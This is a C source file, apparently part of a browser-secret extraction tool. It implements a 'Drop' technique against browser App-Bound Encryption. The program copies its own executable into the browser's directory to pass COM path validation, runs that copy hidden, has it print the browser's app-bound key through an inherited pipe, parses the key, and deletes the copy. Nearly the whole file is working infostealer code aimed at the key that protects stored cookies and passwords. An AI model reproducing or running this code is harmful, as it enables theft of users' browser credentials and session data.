#include "AbeDecrypt.h"

/*** method: Drop (copy self into the browser dir so COM path validation passes) ***/

/* Drop child: runs from the browser directory, writes the key to the stdout pipe */
BOOL
AbeDropChild(
    _In_ const NET_BROWSER_INFO* Browser,
    _In_ ULONG BrowserIndex)
{
    CHAR Line[128];
    HANDLE StdOut;
    ULONG i, Length;

    RtlZeroMemory((PVOID)g_Key, ABE_KEY_SIZE);
    g_Pending = 0;
    g_Code = (LONG)E_FAIL;
    if (!AbePrepareRequest(Browser, BrowserIndex)) return FALSE;
    AbePayloadWorker();
    if (g_Code != 0) return FALSE;

    Length = Str_PrintfExA(Line, sizeof(Line), "KEY=");
    for (i = 0; i < ABE_KEY_SIZE; i++)
    {
        Length += Str_PrintfExA(Line + Length, sizeof(Line) - Length, "%02X", g_Key[i]);
    }
    Str_PrintfExA(Line + Length, sizeof(Line) - Length, "\n");
    StdOut = IO_ConGetStdOutput();
    return StdOut != NULL &&
           NT_SUCCESS(IO_WriteFile(StdOut, NULL, Line, (ULONG)Str_SizeA(Line), NULL));
}

BOOL
AbeGetKeyDrop(
    _In_ const NET_BROWSER_INFO* Browser,
    _In_ ULONG BrowserIndex,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    static UNICODE_STRING NamedPipeDir = RTL_CONSTANT_STRING(L"\\Device\\NamedPipe");
    WCHAR Self[MAX_PATH], Copy[MAX_PATH], Cmd[MAX_PATH * 2], Dir[MAX_PATH];
    STARTUPINFOW Si;
    PROCESS_INFORMATION Pi;
    OBJECT_HANDLE_FLAG_INFORMATION HandleInfo;
    HANDLE PipeDir = NULL, ReadPipe = NULL, WritePipe = NULL;
    static CHAR Buffer[4096];
    CHAR* Line;
    DWORD Read, Total = 0;
    ULONG i, Length;

    /* the child copy runs with the same executable name as ours */
    if (!NT_CopyStringW(&NtCurrentPeb()->ProcessParameters->ImagePathName, Self, MAX_PATH))
    {
        return FALSE;
    }
    Length = (ULONG)(wcsrchr(Browser->ExePath, L'\\') - Browser->ExePath);
    RtlCopyMemory(Dir, Browser->ExePath, Length * sizeof(WCHAR));
    Dir[Length] = UNICODE_NULL;
    Str_PrintfExW(Copy, MAX_PATH, L"%ls\\%ls", Dir, wcsrchr(Self, L'\\') + 1);
    if (!Str_EqualIW(Self, Copy) && !CopyFileW(Self, Copy, FALSE))
    {
        AbeLog(L"Drop: failed to copy into browser directory, gle=%lu (admin required?)\r\n", Err_GetLastError());
        return FALSE;
    }

    if (!NT_SUCCESS(IO_OpenDirectory(&PipeDir,
                                     &NamedPipeDir,
                                     FILE_TRAVERSE,
                                     FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE)) ||
        !NT_SUCCESS(IO_CreatePipe(PipeDir, &ReadPipe, &WritePipe, FILE_PIPE_INBOUND, 0)))
    {
        AbeLog(L"Drop: failed to create pipe\r\n");
        if (PipeDir != NULL) NtClose(PipeDir);
        if (!Str_EqualIW(Self, Copy)) IO_DeleteWin32File(Copy, NULL);
        return FALSE;
    }
    NtClose(PipeDir);

    /* the write end is inherited by the child as stdout/stderr */
    HandleInfo.Inherit = TRUE;
    HandleInfo.ProtectFromClose = FALSE;
    NtSetInformationObject(WritePipe,
                           ObjectHandleFlagInformation,
                           &HandleInfo,
                           sizeof(HandleInfo));

    RtlZeroMemory(&Si, sizeof(Si));
    RtlZeroMemory(&Pi, sizeof(Pi));
    Si.cb = sizeof(Si);
    Si.dwFlags = STARTF_USESTDHANDLES;
    Si.hStdInput = NULL;
    Si.hStdOutput = WritePipe;
    Si.hStdError = WritePipe;
    Str_PrintfExW(Cmd, MAX_PATH * 2, L"\"%ls\" Drop", Copy);
    if (!CreateProcessInternalW(NULL,
                                NULL,
                                Cmd,
                                NULL,
                                NULL,
                                TRUE,
                                CREATE_NO_WINDOW,
                                NULL,
                                NULL,
                                &Si,
                                &Pi,
                                NULL))
    {
        AbeLog(L"Drop: failed to create child process, gle=%lu\r\n", Err_GetLastError());
        NtClose(ReadPipe);
        NtClose(WritePipe);
        if (!Str_EqualIW(Self, Copy)) IO_DeleteWin32File(Copy, NULL);
        return FALSE;
    }
    NtClose(WritePipe);
    NtWaitForSingleObject(Pi.hProcess, FALSE, NULL);

    while (Total < sizeof(Buffer) - 1 &&
           NT_SUCCESS(IO_ReadFile(ReadPipe,
                                  NULL,
                                  Buffer + Total,
                                  (DWORD)(sizeof(Buffer) - 1 - Total),
                                  &Read)) &&
           Read != 0)
    {
        Total += Read;
    }
    NtClose(ReadPipe);
    NtClose(Pi.hThread);
    NtClose(Pi.hProcess);
    if (!Str_EqualIW(Self, Copy)) IO_DeleteWin32File(Copy, NULL);

    /* locate "KEY=" byte-wise: the stream may embed NUL terminators */
    for (i = 0; i + 4 + ABE_KEY_SIZE * 2 <= Total; i++)
    {
        if (Buffer[i] == 'K' && Buffer[i + 1] == 'E' &&
            Buffer[i + 2] == 'Y' && Buffer[i + 3] == '=')
        {
            break;
        }
    }
    if (i + 4 + ABE_KEY_SIZE * 2 > Total)
    {
        AbeLog(L"Drop: no key found in child output\r\n");
        return FALSE;
    }
    Line = Buffer + i + 4;
    for (i = 0; i < ABE_KEY_SIZE; i++)
    {
        INT Hi = Line[i * 2] <= '9' ? Line[i * 2] - '0' : Line[i * 2] - 'A' + 10;
        INT Lo = Line[i * 2 + 1] <= '9' ? Line[i * 2 + 1] - '0' : Line[i * 2 + 1] - 'A' + 10;

        if (Hi < 0 || Hi > 15 || Lo < 0 || Lo > 15) return FALSE;
        Key[i] = (BYTE)((Hi << 4) | Lo);
    }
    return TRUE;
}
